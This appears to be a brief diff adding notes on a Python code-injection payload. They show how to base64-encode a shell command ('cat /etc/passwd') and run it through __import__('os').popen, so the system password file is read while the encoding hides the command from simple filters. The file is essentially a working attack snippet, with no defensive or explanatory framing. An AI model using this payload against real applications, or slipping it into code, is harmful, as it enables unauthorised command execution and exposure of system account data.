@@ -1,0 +1,12 @@
+
+
+1. exac base64decode(payload)# payload - it is command in base64
+2. import base64; b64decode('payload')
+
+payload='cat /etc/passwd'
+
+__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')
+
+__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read()
+
+
